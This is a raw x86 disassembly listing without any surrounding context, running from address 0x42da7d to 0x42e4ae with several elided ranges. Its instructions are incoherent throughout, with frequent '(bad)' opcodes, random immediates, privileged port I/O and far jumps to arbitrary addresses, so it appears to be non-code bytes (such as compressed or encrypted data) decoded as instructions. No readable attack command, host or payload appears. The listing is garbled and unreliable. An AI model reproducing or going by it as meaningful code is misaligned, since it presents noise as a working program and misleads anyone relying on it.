  42da7d:	xlat   BYTE PTR ds:[ebx]
  42da7e:	mov    eax,ds:0xa10c853f
  42da83:	dec    ecx
  42da84:	xor    BYTE PTR [esi-0x136de5a2],dl
  42da8a:	xor    dh,BYTE PTR [eax]
  42da8c:	mov    esp,0x65b0b4a2
  42da91:	and    BYTE PTR [ebx],ah
  42da93:	sbb    DWORD PTR [eax+0x41],edi
  42da96:	and    al,dh
  42da98:	xchg   ecx,eax
  42da99:	(bad)  
  42da9b:	mov    eax,0x7145cf0b
  42daa0:	test   DWORD PTR [edx],edx
  42daa2:	add    cl,BYTE PTR [ebp+0x4]
  42daa5:	lea    eax,[ebx-0x3b]
  42daa8:	cs aaa 
  42daaa:	pop    esp
  42daab:	fsub   DWORD PTR [ecx+0x1ce9c557]
  42dab1:	in     al,dx
  42dab2:	stc    
  42dab3:	cmp    eax,DWORD PTR [esi-0x4d]
  42dab6:	gs inc ecx
  42dab8:	pushf  
  42dab9:	loop   0x42db07
  42dabb:	arpl   WORD PTR [esi+0x209344c],sp
  42dac1:	addr16 dec eax
  42dac3:	(bad)  
  42dac4:	out    dx,al
  42dac5:	shl    DWORD PTR [edx-0x14900d7f],0x61
  42dacc:	or     DWORD PTR [eax+0x20],0xc6917617
  42dad3:	mov    eax,0x458f7b55
  42dad8:	dec    edi
  42dad9:	jge    0x42dad4
  42dadb:	mov    ecx,0x2ab70db1
  42dae0:	adc    al,BYTE PTR [edi]
  42dae2:	adc    BYTE PTR [edi],al
  42dae4:	add    cl,cl
  42dae6:	test   al,0x81
  42dae8:	cmp    eax,0x926ba2a4
  42daed:	fcom   QWORD PTR [ebx+0x7a9f6872]
  42daf3:	mov    esp,0x25c8d71f
  42daf8:	retf   
  42daf9:	pop    ds
  42dafa:	and    bh,cl
  42dafc:	jo     0x42db30
  42dafe:	cmp    ch,BYTE PTR [ebx+0x31bbf42c]
  42db04:	mov    BYTE PTR [eax+0x7df9e5ba],ch
  42db0a:	cli    
  42db0b:	jb     0x42dab4
  42db0d:	sahf   
  42db0e:	adc    al,0x97
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbcd
  42db81:	sar    ecx,0xe5
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	xchg   BYTE PTR [esi],dl
  42db8e:	imul   ebx,DWORD PTR [ebx+0x4c943399],0xfffffff4
  42db95:	push   0xeb1ca163
  42db9a:	outs   dx,DWORD PTR ds:[esi]
  42db9b:	aad    0xf1
  42db9d:	mov    al,ds:0x8cc845c8
  42dba2:	xor    ebx,eax
  42dba4:	and    al,0x6b
  42dba6:	pop    esp
  42dba7:	and    ah,BYTE PTR [edi-0x6e96e8e5]
  42dbad:	imul   edi,DWORD PTR ds:0x7206d0b7,0x8c9a9248
  42dbb7:	push   ds
  42dbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbb9:	hlt    
  42dbba:	jno    0x42dc39
  42dbbc:	inc    edi
  42dbbd:	or     ecx,DWORD PTR [edi-0x275407b9]
  42dbc3:	xor    ch,dh
  42dbc5:	nop
  42dbc6:	mov    ds:0x46c94b1,al
  42dbcb:	and    cl,0xc2
  42dbce:	sbb    ah,BYTE PTR [ecx+0xee2fcae]
  42dbd4:	addr16 pop ebx
  42dbd6:	jbe    0x42dbab
  42dbd8:	mov    ch,0x62
  42dbda:	mov    ch,0x10
  42dbdc:	clc    
  42dbdd:	sub    eax,0xab03de10
  42dbe2:	pop    esp
  42dbe3:	or     edi,DWORD PTR [esp+ebx*2-0x11]
  42dbe7:	xor    BYTE PTR [ebx],al
  42dbe9:	aam    0x78
  42dbeb:	add    eax,0x9a3518a1
  42dbf0:	fnstenv [ecx+esi*4-0x3c0623b2]
  42dbf7:	mov    al,ds:0xa7e2d692
  42dbfc:	push   ebx
  42dbfd:	pop    esi
  42dbfe:	nop
  42dbff:	pop    si
  42dc01:	cmp    DWORD PTR [eax+0x557f6402],edx
  42dc07:	bound  esp,QWORD PTR [ecx]
  42dc09:	ins    DWORD PTR es:[edi],dx
  42dc0a:	dec    eax
  42dc0b:	push   es
  42dc0c:	(bad)  
  42dc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc0e:	cmp    edx,ebp
  42dc10:	arpl   WORD PTR [eax],si
  42dc12:	gs mov ebx,0xfa11760c
  42dc18:	mov    BYTE PTR [ecx-0x4233b74d],0xac
  42dc1f:	mov    esp,0x6c6118bd
  42dc24:	sub    DWORD PTR [ebp-0x41],ebx
  42dc27:	dec    esp
  42dc28:	fs cmp eax,0xc5e7ef1d
  42dc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc2f:	test   eax,0xda18c98a
  42dc34:	jge    0x42dbda
  42dc36:	rcr    DWORD PTR [ebx+0x24],1
  42dc39:	mov    ds:0x96702854,al
  42dc3e:	or     BYTE PTR [ecx-0x69],cl
  42dc41:	mul    BYTE PTR [ebx+esi*4]
  42dc44:	pop    edx
  42dc45:	sbb    ebp,DWORD PTR [edi+0x54]
  42dc48:	xchg   ecx,eax
  42dc49:	data16 mov cl,0xa6
  42dc4c:	inc    esp
  42dc4d:	data16 shl BYTE PTR [edx+0x3],cl
  42dc51:	inc    eax
  42dc52:	mov    esp,0xd23d8537
  42dc57:	loopne 0x42dcbd
  42dc59:	adc    ecx,DWORD PTR [ecx]
  42dc5b:	dec    ebp
  42dc5c:	mov    bl,0x99
  42dc5e:	lods   eax,DWORD PTR ds:[esi]
  42dc5f:	inc    eax
  42dc60:	ja     0x42dc38
  42dc62:	cmp    DWORD PTR [eax],ebx
  42dc64:	addr16 sbb ch,ch
  42dc67:	inc    esi
  42dc68:	das    
  42dc69:	cmc    
  42dc6a:	inc    ebx
  42dc6b:	das    
  42dc6c:	jo     0x42dce2
  42dc6e:	fimul  WORD PTR [ebx-0x45]
  42dc71:	sbb    esp,0x5c
  42dc74:	sbb    ebp,DWORD PTR [eax-0x6c64771c]
  42dc7a:	pop    ds
  42dc7b:	push   ss
  42dc7c:	pop    ss
  42dc7d:	pop    esi
  42dc7e:	cmp    DWORD PTR [ebx+0x55fecc3b],esp
  42dc84:	pop    ebx
  42dc85:	push   ds
  42dc86:	fiadd  DWORD PTR fs:[ebx-0x51]
  42dc8a:	jmp    0x42dc8f
  42dc8c:	push   ds
  42dc8d:	cs push ebx
  42dc8f:	repz add BYTE PTR [eax],al
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	mov    ds:0x2cca68bc,eax
  42dd05:	jmp    0x0:0x1040001
  42dd0c:	aas    
  42dd0d:	in     al,dx
  42dd0e:	fnsave [ecx+0x17]
  42dd11:	sub    al,0xde
  42dd13:	fcomp  QWORD PTR [edx+ebp*1+0x3a]
  42dd17:	or     al,0x45
  42dd19:	dec    esp
  42dd1a:	mov    edx,0xa3a685c5
  42dd1f:	xor    al,0xbf
  42dd21:	and    dl,cl
  42dd23:	test   al,0xe1
  42dd25:	xor    cl,BYTE PTR [edx+0x6d]
  42dd28:	sub    al,0x93
  42dd2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd2b:	push   ebx
  42dd2c:	cmp    dh,BYTE PTR [esi+0x65df263f]
  42dd32:	mov    WORD PTR [edx],ss
  42dd34:	icebp  
  42dd35:	or     al,0x48
  42dd37:	jo     0x42dd1a
  42dd39:	inc    ecx
  42dd3a:	xor    al,0x1a
  42dd3c:	jecxz  0x42dcd2
  42dd3e:	pop    esi
  42dd3f:	call   0xac73fec5
  42dd44:	jp     0x42dd48
  42dd46:	daa    
  42dd47:	ins    BYTE PTR es:[edi],dx
  42dd48:	shl    BYTE PTR [ecx-0xb],0xe9
  42dd4c:	out    0xbf,al
  42dd4e:	add    al,ah
  42dd50:	xchg   esp,eax
  42dd51:	dec    ebp
  42dd52:	popf   
  42dd53:	sub    BYTE PTR [ebx+0x412a5ce4],dl
  42dd59:	cmp    BYTE PTR [ebx+0x54],ah
  42dd5c:	dec    ecx
  42dd5d:	stc    
  42dd5e:	stos   BYTE PTR es:[edi],al
  42dd5f:	enter  0x7918,0xe1
  42dd63:	xchg   ebx,eax
  42dd64:	adc    DWORD PTR [esi-0x49],0x52
  42dd68:	push   esp
  42dd69:	icebp  
  42dd6a:	xchg   ebp,eax
  42dd6b:	mov    edx,0xe60f5c27
  42dd70:	mov    ss,WORD PTR [esi-0x5]
  42dd73:	enter  0xe7e,0xfc
  42dd77:	cwde   
  42dd78:	push   ds
  42dd79:	out    0x66,al
  42dd7b:	inc    edi
  42dd7c:	cmp    esp,ebx
  42dd7e:	int3   
  42dd7f:	xchg   esp,eax
  42dd80:	mov    ds:0x8530f294,eax
  42dd85:	xor    eax,0x92518900
  42dd8a:	xchg   esp,eax
  42dd8b:	add    BYTE PTR [edx-0x669d8b99],cl
  42dd91:	adc    BYTE PTR [esi-0x391f166a],ch
  42dd97:	loop   0x42dde5
  42dd99:	or     eax,0xe31d8d1d
  42dd9e:	pop    es
  42dd9f:	outs   dx,BYTE PTR ds:[si]
  42dda1:	fwait
  42dda2:	mov    ch,0xe3
  42dda4:	iret   
  42dda5:	into   
  42dda6:	pushf  
  42dda7:	xor    ah,BYTE PTR [esi*1+0x2191da1c]
  42ddae:	push   esp
  42ddaf:	es xchg edi,eax
  42ddb1:	pop    ss
  42ddb2:	je     0x42de2a
  42ddb4:	jno    0x42dd4a
  42ddb6:	pop    eax
  42ddb7:	pop    esp
  42ddb8:	push   eax
  42ddb9:	mov    eax,ds:0x9b957650
  42ddbe:	test   al,0xb9
  42ddc0:	nop
  42ddc1:	retf   0x71c1
  42ddc4:	or     ecx,DWORD PTR [ebp+ebp*8-0x18d6bedb]
  42ddcb:	cmp    bh,BYTE PTR [esp+ecx*2-0x57ea400e]
  42ddd2:	inc    ebp
  42ddd3:	inc    edi
  42ddd4:	test   eax,0xc15a222d
  42ddd9:	(bad)  
  42ddda:	aam    0x5b
  42dddc:	std    
  42dddd:	sbb    ah,ah
  42dddf:	out    0x5c,eax
  42dde1:	fwait
  42dde2:	sub    cl,dh
  42dde4:	lahf   
  42dde5:	xchg   DWORD PTR [ebx+edi*1],esp
  42dde8:	mov    esi,0x594ab33b
  42dded:	into   
  42ddee:	adc    ebx,eax
  42ddf0:	fld    QWORD PTR [edi+0x13]
  42ddf3:	adc    BYTE PTR [ebx],bh
  42ddf5:	jae    0x42ddd5
  42ddf7:	sti    
  42ddf8:	scas   eax,DWORD PTR es:[edi]
  42ddf9:	jp     0x42ddf1
  42ddfb:	add    eax,0xc6b43dcc
  42de00:	jb     0x42ddb6
  42de02:	xchg   esi,eax
  42de03:	outs   dx,DWORD PTR ds:[esi]
  42de04:	xchg   ecx,eax
  42de05:	test   DWORD PTR [esi],ebx
  42de07:	ss (bad) 
  42de09:	aam    0xdf
  42de0b:	stos   BYTE PTR es:[edi],al
  42de0c:	cdq    
  42de0d:	jno    0x42de86
  42de0f:	cmc    
	...
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de81:	retf   
  42de82:	icebp  
  42de83:	dec    esi
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	jnp    0x42de26
  42de8e:	inc    eax
  42de8f:	pop    esi
  42de90:	push   eax
  42de91:	sub    BYTE PTR [edx-0xb0cbc8c],bl
  42de97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de98:	jo     0x42deb1
  42de9a:	repnz sub dh,BYTE PTR [eax+0x1e89cb0f]
  42dea1:	sbb    al,0x9d
  42dea3:	push   ebx
  42dea4:	mov    eax,0x3777e389
  42dea9:	xchg   ebp,eax
  42deaa:	pop    ebx
  42deab:	hlt    
  42deac:	adc    ebx,DWORD PTR [ebx+0x74fbd4b9]
  42deb2:	shr    BYTE PTR [edx-0x3fbb26e5],0xd9
  42deb9:	cmc    
  42deba:	dec    ebx
  42debb:	fcom   st(6)
  42debd:	add    DWORD PTR [eax+0x46c14c4c],edi
  42dec3:	das    
  42dec4:	xchg   ebp,eax
  42dec5:	out    0xa9,eax
  42dec7:	push   ecx
  42dec8:	fs popf 
  42deca:	push   ds
  42decb:	fisttp QWORD PTR [eax]
  42decd:	repz (bad) 
  42ded0:	aam    0xe1
  42ded2:	mov    bh,0xec
  42ded4:	xor    BYTE PTR [edi+0x32],dl
  42ded7:	int3   
  42ded8:	sub    esp,esp
  42deda:	shr    BYTE PTR [ecx+0x7b068bf2],1
  42dee0:	or     eax,0x527e766
  42dee5:	mov    edi,0xe20d99d
  42deea:	mov    al,ds:0x7f4ffe30
  42deef:	mov    edx,0x6ab22675
  42def4:	inc    edi
  42def5:	mov    al,0x13
  42def7:	and    al,0x7
  42def9:	jle    0x42debb
  42defb:	cwde   
  42defc:	inc    ecx
  42defd:	adc    ch,0x21
  42df00:	push   edx
  42df01:	pop    eax
  42df02:	push   esp
  42df03:	int3   
  42df04:	cld    
  42df05:	ja     0x42df71
  42df07:	pushf  
  42df08:	cdq    
  42df09:	jmp    0x42df73
  42df0b:	cwde   
  42df0c:	mov    ?,WORD PTR [ebp+0x28dc1496]
  42df12:	jle    0x42dedf
  42df14:	aas    
  42df15:	mov    ch,0x62
  42df17:	ins    BYTE PTR es:[edi],dx
  42df18:	bound  ebx,QWORD PTR ds:0xf35a1991
  42df1e:	inc    esp
  42df1f:	leave  
  42df20:	lock add al,BYTE PTR [ebx]
  42df23:	jmp    0x42df47
  42df25:	add    edx,0x7d486359
  42df2b:	mov    edi,0x47bd692c
  42df30:	cmp    BYTE PTR [ebx+0x6c9c3e15],ah
  42df36:	mov    ds:0x6dbae713,al
  42df3b:	daa    
  42df3c:	in     al,dx
  42df3d:	das    
  42df3e:	cmp    DWORD PTR gs:[ebx-0x1f5e091c],edx
  42df45:	mov    eax,ds:0xe1a7734f
  42df4a:	popf   
  42df4b:	outs   dx,BYTE PTR ds:[esi]
  42df4c:	shl    BYTE PTR [esi-0x53],0xe1
  42df50:	fidiv  WORD PTR [esp+ebp*2-0x5d]
  42df54:	jge    0x42defd
  42df56:	out    0xef,al
  42df58:	jae    0x42df4c
  42df5a:	push   esp
  42df5b:	nop
  42df5c:	and    BYTE PTR [eax-0x381cbf3d],0x7a
  42df63:	xchg   esp,eax
  42df64:	lods   eax,DWORD PTR ds:[esi]
  42df65:	das    
  42df66:	imul   edx,esi,0x4d
  42df69:	loop   0x42df88
  42df6b:	and    DWORD PTR [esi+0x76],edi
  42df6e:	jg     0x42dfb3
  42df70:	fst    DWORD PTR [eax-0x38]
  42df73:	fidivr WORD PTR ds:0x40e99d06
  42df79:	imul   edi,DWORD PTR [edx],0xd3212e8f
  42df7f:	into   
  42df80:	into   
  42df81:	jecxz  0x42dfb6
  42df83:	ja     0x42dfa0
  42df85:	push   esp
  42df86:	fcmovu st,st(6)
  42df88:	or     eax,ecx
  42df8a:	xchg   DWORD PTR [ecx+eiz*4+0x676392],eax
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0xd]
  42e001:	ret    0x4e01
  42e004:	xor    al,0xec
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	sbb    DWORD PTR [edx-0x5822af53],edx
  42e012:	in     eax,0xf6
  42e014:	push   edi
  42e015:	jmp    0xcd0f:0x6a9e333c
  42e01c:	clc    
  42e01d:	jbe    0x42e052
  42e01f:	dec    ebx
  42e020:	dec    eax
  42e021:	aam    0xb1
  42e023:	and    BYTE PTR [edx+0x75804d3c],0xee
  42e02a:	pop    ss
  42e02b:	or     al,0x33
  42e02d:	jmp    0xe1f421db
  42e032:	sahf   
  42e033:	int    0x85
  42e035:	outs   dx,DWORD PTR ds:[esi]
  42e036:	dec    eax
  42e037:	inc    eax
  42e038:	fs aas 
  42e03a:	out    0x1c,eax
  42e03c:	and    al,0x49
  42e03e:	sar    BYTE PTR [ebx],0x49
  42e041:	rcl    ebx,0xcc
  42e044:	gs nop
  42e046:	add    al,0x53
  42e048:	std    
  42e049:	or     al,0x5e
  42e04b:	mov    ss:0x29f43c29,al
  42e051:	sbb    DWORD PTR [ebp+0x24],0x92570be8
  42e058:	or     dh,ch
  42e05a:	push   0x388cdb29
  42e05f:	sub    eax,0xf873aecb
  42e064:	inc    esp
  42e065:	xchg   ebx,eax
  42e066:	in     al,dx
  42e067:	fs cdq 
  42e069:	push   ecx
  42e06a:	pop    es
  42e06b:	(bad)  
  42e06c:	cmp    ebp,DWORD PTR [edi+0x3c]
  42e06f:	fmul   st,st(1)
  42e071:	jo     0x42e0b6
  42e073:	ss loope 0x42e050
  42e076:	in     eax,dx
  42e077:	ret    
  42e078:	sub    BYTE PTR gs:[ecx+0x35f58f79],ah
  42e07f:	mov    esp,0x38b04ba0
  42e084:	pop    edx
  42e085:	add    cl,BYTE PTR es:[edx]
  42e088:	(bad)  
  42e089:	popf   
  42e08a:	push   edx
  42e08b:	mov    DWORD PTR ds:0x484288e1,eax
  42e091:	add    ch,dh
  42e093:	cmp    DWORD PTR [ebp+0x320428a8],esp
  42e099:	imul   eax,DWORD PTR [edx+0x523c63a5],0x57
  42e0a0:	push   es
  42e0a1:	aaa    
  42e0a2:	add    al,0x77
  42e0a4:	pop    es
  42e0a5:	fucomi st,st(1)
  42e0a7:	xor    eax,0xa7f01169
  42e0ac:	or     eax,0x578acf6d
  42e0b1:	retf   
  42e0b2:	pop    edi
  42e0b3:	daa    
  42e0b4:	mov    eax,ds:0x3f26bdbb
  42e0b9:	bswap  esp
  42e0bb:	adc    DWORD PTR [ebx-0x36a52d75],esp
  42e0c1:	outs   dx,BYTE PTR ds:[esi]
  42e0c2:	adc    ebp,DWORD PTR [bx+si+0x6b]
  42e0c6:	adc    al,0x5d
  42e0c8:	pop    es
  42e0c9:	mov    dh,0x3a
  42e0cb:	or     eax,DWORD PTR [edx+0x6b52b76b]
  42e0d1:	test   BYTE PTR [edi+eiz*8+0x1],ch
  42e0d5:	mov    edx,0x195f16fb
  42e0da:	ror    edx,cl
  42e0dc:	aad    0xca
  42e0de:	mov    dh,0xbc
  42e0e0:	mov    cs,WORD PTR [edx-0x4a0fb60e]
  42e0e6:	jne    0x42e0e9
  42e0e8:	add    ah,bh
  42e0ea:	fsub   DWORD PTR [edx+eiz*4-0x2e]
  42e0ee:	push   cs
  42e0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0f0:	mov    cl,0x98
  42e0f2:	sti    
  42e0f3:	mov    eax,ds:0x6e3e915c
  42e0f8:	and    eax,0x25768905
  42e0fd:	and    esp,DWORD PTR ds:0x746f6bf0
  42e103:	fst    QWORD PTR [ebx]
  42e105:	and    al,0xe9
  42e107:	add    BYTE PTR [edi+0x718e31fe],ah
  42e10d:	sub    ch,BYTE PTR [ebp+edx*8+0x0]
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	or     BYTE PTR [esp+ebx*1+0x51],0x38
  42e185:	in     eax,dx
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	in     al,0x2c
  42e18e:	xchg   esp,eax
  42e18f:	xor    DWORD PTR [eax-0x80],edi
  42e192:	adc    eax,0xf5135b21
  42e197:	mov    bh,0xf9
  42e199:	arpl   WORD PTR [ebp-0x6a],bx
  42e19c:	arpl   WORD PTR [edi],ax
  42e19e:	test   ebx,esi
  42e1a0:	cdq    
  42e1a1:	jg     0x42e215
  42e1a3:	fst    DWORD PTR [edi]
  42e1a5:	jp     0x42e131
  42e1a7:	mov    ?,WORD PTR [esi+0x50bb66e]
  42e1ad:	xchg   DWORD PTR ds:0xa582f613,edx
  42e1b3:	push   eax
  42e1b4:	dec    esp
  42e1b5:	out    dx,al
  42e1b6:	or     al,0x60
  42e1b8:	xor    DWORD PTR ds:0xfd554982,0x3f
  42e1bf:	sub    ch,dl
  42e1c1:	jb     0x42e1b2
  42e1c3:	inc    edx
  42e1c4:	(bad)  
  42e1c5:	mov    esp,0xc6be2046
  42e1ca:	add    eax,0x3351fd14
  42e1cf:	ret    
  42e1d0:	dec    ebx
  42e1d1:	(bad)  
  42e1d2:	fcmovbe st,st(1)
  42e1d4:	lock jnp 0x42e21f
  42e1d7:	loopne 0x42e1b3
  42e1d9:	cwde   
  42e1da:	inc    edi
  42e1db:	mov    bl,0xc1
  42e1dd:	inc    ecx
  42e1de:	fistp  DWORD PTR [ebx]
  42e1e0:	mov    dl,0x81
  42e1e2:	ret    
  42e1e3:	mov    edi,0xad9c4175
  42e1e8:	sahf   
  42e1e9:	jmp    0x67d63c00
  42e1ee:	jo     0x42e259
  42e1f0:	cmp    ah,BYTE PTR [esi+esi*1]
  42e1f3:	(bad)  
  42e1f4:	into   
  42e1f5:	cmp    DWORD PTR [eax],0xde8698d7
  42e1fb:	dec    edx
  42e1fc:	shl    bh,0x2f
  42e1ff:	jnp    0x42e24b
  42e201:	xor    cl,BYTE PTR [eax+0x79]
  42e204:	pushf  
  42e205:	adc    DWORD PTR [eax+eax*4+0x3e5b61bb],esi
  42e20c:	adc    al,0xb3
  42e20e:	mov    ds:0x8e93cfe9,al
  42e213:	sbb    DWORD PTR [ebx+ecx*8+0x24b48c0f],ebp
  42e21a:	add    bh,BYTE PTR [edx]
  42e21c:	sub    eax,0x6686d385
  42e221:	add    bh,al
  42e223:	mov    ch,0x3f
  42e225:	shr    DWORD PTR [esi+0x12],cl
  42e228:	loopne 0x42e278
  42e22a:	xor    dh,BYTE PTR ds:0x8c96d3fa
  42e230:	retf   
  42e231:	fnstenv [ebp+eax*1+0x1c]
  42e235:	push   cs
  42e236:	and    esp,DWORD PTR ds:0x14fce62a
  42e23c:	and    bl,BYTE PTR [eax]
  42e23e:	cwde   
  42e23f:	xchg   ebx,eax
  42e240:	repnz sub eax,0x1b21c70
  42e246:	fimul  DWORD PTR [edx+0x325e4fce]
  42e24c:	xchg   esp,eax
  42e24d:	aam    0x7
  42e24f:	inc    edi
  42e250:	dec    esp
  42e251:	out    0xd4,al
  42e253:	fisub  DWORD PTR [eax-0xd]
  42e256:	sub    esp,esp
  42e258:	repnz sub eax,0xe77efe26
  42e25e:	loop   0x42e2b8
  42e260:	push   es
  42e261:	pop    ebx
  42e262:	sbb    eax,0x8327c453
  42e267:	dec    edx
  42e268:	loop   0x42e21e
  42e26a:	jns    0x42e26d
  42e26c:	retf   0xc3e0
  42e26f:	xchg   ecx,eax
  42e270:	stos   DWORD PTR es:[edi],eax
  42e271:	shr    esp,0xd1
  42e274:	cli    
  42e275:	mov    cl,0x30
  42e277:	das    
  42e278:	xchg   ebx,eax
  42e279:	fadd   st(5),st
  42e27b:	(bad)  
  42e27c:	jl     0x42e28c
  42e27e:	ss int 0xfe
  42e281:	(bad)  [eax-0x16c95217]
  42e287:	dec    ebx
  42e288:	adc    DWORD PTR [ecx-0x54],0x7e03f8d
  42e28f:	fld    QWORD PTR [eax]
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x24199140
  42e301:	xchg   esi,eax
  42e302:	leave  
  42e303:	mov    dh,0x3c
  42e305:	out    dx,al
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	xor    esp,DWORD PTR [esi+0x7eb06b62]
  42e312:	push   cs
  42e313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e314:	stc    
  42e315:	inc    eax
  42e316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e317:	in     al,0x3
  42e319:	pop    edx
  42e31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e31b:	adc    cl,BYTE PTR ss:[edi+0x62]
  42e31f:	push   ds
  42e320:	xor    eax,0xab88f185
  42e325:	push   esp
  42e326:	cld    
  42e327:	push   ecx
  42e328:	and    DWORD PTR [ebx-0x72b764b9],esp
  42e32e:	sub    eax,0xffffff8b
  42e331:	jmp    0x2dc8:0x487ec947
  42e338:	push   ss
  42e339:	jbe    0x42e324
  42e33b:	sub    ebx,DWORD PTR [ebx-0x6b9476a8]
  42e341:	enter  0xb0e8,0xf6
  42e345:	mul    DWORD PTR ds:0x969e0217
  42e34b:	ins    DWORD PTR es:[edi],dx
  42e34c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e34d:	loope  0x42e354
  42e34f:	loopne 0x42e301
  42e351:	xchg   esi,eax
  42e352:	outs   dx,DWORD PTR ds:[esi]
  42e353:	sbb    BYTE PTR [edi+eax*4],0x23
  42e357:	sbb    DWORD PTR [ebx-0x31],esi
  42e35a:	push   es
  42e35b:	inc    esi
  42e35c:	or     al,0x90
  42e35e:	sub    dh,BYTE PTR [ebp-0x45b73a01]
  42e364:	lock mov eax,ds:0xaac1edbd
  42e36a:	jo     0x42e3a0
  42e36c:	loopne 0x42e316
  42e36e:	into   
  42e36f:	xor    DWORD PTR [eax],ebx
  42e371:	mov    esp,0xc0409521
  42e376:	mov    cl,0xa8
  42e378:	mov    ebp,0x28cb42d1
  42e37d:	cwde   
  42e37e:	stc    
  42e37f:	clc    
  42e380:	hlt    
  42e381:	in     eax,dx
  42e382:	test   DWORD PTR [ecx],edx
  42e384:	loop   0x42e3e4
  42e386:	add    al,0x20
  42e388:	std    
  42e389:	adc    eax,0x2c6aadd8
  42e38e:	inc    eax
  42e38f:	pop    ss
  42e390:	cmp    esp,DWORD PTR [edi-0x20]
  42e393:	outs   dx,BYTE PTR ds:[esi]
  42e394:	push   esp
  42e395:	mov    eax,0xa5b14dd9
  42e39a:	xchg   DWORD PTR [edi],ebx
  42e39c:	mov    ecx,0xd9d882b
  42e3a1:	inc    edi
  42e3a2:	xor    cl,dh
  42e3a4:	(bad)  
  42e3a5:	(bad)  [ebx-0x30]
  42e3a8:	mov    ecx,0x74edbc94
  42e3ad:	mov    es,WORD PTR [edx-0x7ec9ba8d]
  42e3b3:	fist   DWORD PTR [edx-0x43]
  42e3b6:	mov    ds:0xdc479a71,eax
  42e3bb:	test   eax,0x64f0f9dd
  42e3c0:	sbb    ch,bh
  42e3c2:	aam    0x64
  42e3c4:	dec    edx
  42e3c5:	not    BYTE PTR [ecx+0x7e]
  42e3c8:	inc    ebx
  42e3c9:	gs pop ds
  42e3cb:	int    0x4e
  42e3cd:	fild   QWORD PTR [ebx-0x5653290a]
  42e3d3:	cs retf 0xfdd3
  42e3d7:	mov    esi,0x13280fc5
  42e3dc:	ds push 0xffffff81
  42e3df:	test   al,al
  42e3e1:	js     0x42e374
  42e3e3:	pop    edx
  42e3e4:	mov    al,ds:0xd6f6ffa7
  42e3e9:	inc    edx
  42e3ea:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42e3ec:	dec    edx
  42e3ed:	mov    eax,DWORD PTR [eax+0x1ecfbc3a]
  42e3f3:	xchg   edx,eax
  42e3f4:	das    
  42e3f5:	outs   dx,BYTE PTR ds:[esi]
  42e3f6:	inc    esi
  42e3f7:	out    dx,al
  42e3f8:	cmc    
  42e3f9:	push   ecx
  42e3fa:	rcr    DWORD PTR [eax-0x5],1
  42e3fd:	mov    al,0x13
  42e3ff:	call   0xd9e5:0x4729cc07
  42e406:	ret    
  42e407:	jmp    0xe788:0x750e0ae1
  42e40e:	xor    cl,BYTE PTR [ecx+0x0]
	...
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	out    dx,eax
  42e481:	(bad)  
  42e482:	dec    esp
  42e483:	clc    
  42e484:	inc    eax
  42e485:	out    dx,eax
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    al,0x1
  42e48a:	add    BYTE PTR [eax],al
  42e48c:	push   ds
  42e48d:	imul   esi,DWORD PTR [edi+eax*4-0x297aa620],0x9
  42e495:	fwait
  42e496:	sub    DWORD PTR [ebx+0x4bc3d47e],eax
  42e49c:	xchg   edi,ebx
  42e49e:	add    al,0x5
  42e4a0:	out    dx,eax
  42e4a1:	cmp    eax,ebx
  42e4a3:	dec    ebp
  42e4a4:	xor    DWORD PTR [ecx+0x49],edi
  42e4a7:	in     eax,dx
  42e4a8:	cmp    ebx,edx
  42e4aa:	(bad)  
  42e4ab:	dec    edi
  42e4ac:	jle    0x42e454
  42e4ae:	aad    0x99
